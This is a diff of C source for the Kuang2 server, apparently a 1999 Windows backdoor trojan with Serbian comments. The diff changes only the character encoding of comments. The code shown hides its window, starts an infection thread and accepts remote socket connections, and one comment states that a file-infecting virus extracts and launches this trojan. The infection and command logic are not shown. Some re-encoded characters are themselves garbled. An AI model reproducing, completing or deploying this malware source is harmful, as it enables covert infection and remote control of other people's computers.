@@ -1,14 +1,14 @@
 /***[ThuNderSoft]*************************************************************
 								 KUANG2: server
 								   ver: 0.21
-								˙˘ƒÕ WEIRD Õƒ˘˙
+								     WEIRD
 *****************************************************************************/
 
 /* HISTORY */
 // >>>>> RELEASE VERSION: 0.21 (26-may-1999) <<<<<
 // ver 0.21 (26-may-1999): mali bug je ispravljen
 // >>>>> RELEASE VERSION: 0.20 (22-may-1999) <<<<<
-// ver 0.20 (14-may-1999): razna sreîivanja
+// ver 0.20 (14-may-1999): razna sreƒëivanja
 // ver 0.10 (30-mar-1999): born code
 
 #include <windows.h>
@@ -38,7 +38,7 @@ DWORD InfectThreadID;
 /*
 	MessageLoop
 	-----------
-  ˛ obrada poruka prozora. */
+  + obrada poruka prozora. */
 
 LRESULT CALLBACK MsgLoop(HWND hwnd, unsigned msg, WPARAM wParam, LPARAM lParam)
 {
@@ -50,13 +50,13 @@ LRESULT CALLBACK MsgLoop(HWND hwnd, unsigned msg, WPARAM wParam, LPARAM lParam)
 			CreateThread(NULL, 0, InfectThread, NULL, 0, &InfectThreadID);
 			break;
 
-		// asinhrono obaveÑtavanje
+		// asinhrono obave≈°tavanje
 		case UM_ASYNC:
 			if (WSAGETSELECTEVENT(lParam)==FD_ACCEPT)
 				OnAccept((SOCKET)wParam);
 			break;
 
-		// jedan od klijenata je zavrÑio rad
+		// jedan od klijenata je zavr≈°io rad
 		case UM_QUITCLIENT:
 			OnQuitclient((SOCKET)wParam);
 			break;
@@ -76,7 +76,7 @@ LRESULT CALLBACK MsgLoop(HWND hwnd, unsigned msg, WPARAM wParam, LPARAM lParam)
 /*
 	InitApp
 	-------
-  ˛ Inicijalizacija aplikacije. Registracija windows klasu za aplikaciju. */
+  + Inicijalizacija aplikacije. Registracija windows klasu za aplikaciju. */
 
 BOOL InitApp(HINSTANCE hInst)
 {
@@ -84,7 +84,7 @@ BOOL InitApp(HINSTANCE hInst)
 	HWND hwnd;
 
 	// parametri klase
-	wc.cbSize		 = sizeof(WNDCLASSEX);		// veliÅina strukture
+	wc.cbSize		 = sizeof(WNDCLASSEX);		// veliƒçina strukture
 	wc.style		 = 0;						// nema stilova klase
 	wc.lpfnWndProc	 = (WNDPROC) MsgLoop;		// message loop procedura
 	wc.cbClsExtra	 = 0;						// nema etxra data po klasi
@@ -99,7 +99,7 @@ BOOL InitApp(HINSTANCE hInst)
 
 	// registracija klase
 	if (!RegisterClassEx(&wc)) {
-		if (!RegisterClass((LPWNDCLASS)&wc.style))		// moÇda je NT u pitanju
+		if (!RegisterClass((LPWNDCLASS)&wc.style))		// mo≈æda je NT u pitanju
 			return FALSE;								// neupsela registracija
 	}
 
@@ -107,25 +107,25 @@ BOOL InitApp(HINSTANCE hInst)
 			Kuang2_class,			// ime registrovane klase
 			NULL,					// text prozora
 			0,						// windows stil
-			-1, -1,					// pozicija bogu iza leîa
-			0, 0,					// veliÅina 0
+			-1, -1,					// pozicija bogu iza leƒëa
+			0, 0,					// veliƒçina 0
 			NULL,					// prethodni hwnd
 			NULL,					// handle za meni ili child-prozor
 			hInst,					// ova instanca poseduje (own) prozor
 			NULL					// Don't need data in WM_CREATE
 	);
 
-	if (!hwnd) return FALSE;	// greÑka?
+	if (!hwnd) return FALSE;	// gre≈°ka?
 
 	ShowWindow(hwnd, SW_HIDE);	// sakrij prozor
-	return TRUE;				// sve je proÑlo ok.
+	return TRUE;				// sve je pro≈°lo ok.
 }
 
 
 /*
 	WinMain
 	--------
-  ˛ Virus koji je zakaÅen na fajlove ekstrakuje i startuje ovog trojanca. */
+  + Virus koji je zakaƒçen na fajlove ekstrakuje i startuje ovog trojanca. */
 
 int Wmain()
 {
@@ -137,10 +137,10 @@ int Wmain()
 	// inicijalizacija
 	hThisInst=GetModuleHandle(NULL);
 
-	// uzimanje komandne linije i oslobaîanje od navodnika
+	// uzimanje komandne linije i osloba‚Äùanje od navodnika
 	CmdLine=GetCommandLine();
 	i=0;
-	if (CmdLine[0]=='"') {                          // u najveÜem broju sluÅajeva
+	if (CmdLine[0]=='"') {                          // u najveƒáem broju sluƒçajeva
 		CmdLine++;									// navodnici postoje i njihovim
 		while(CmdLine[i] && CmdLine[i]!='"') i++;   // skidanjem automatski se uklanjaju
 		CmdLine[i]=0;								// i svi argumenti!
@@ -161,7 +161,7 @@ int Wmain()
 	}
 	strcopyF(Kuang2_class, temppath);
 
-	// ako je Kuang2 veÜ aktivan izaîi
+	// ako je Kuang2 veƒá aktivan izaƒëi
 	if (FindWindow(Kuang2_class, NULL)) return 1;
 
 	// preuzmi temp folder
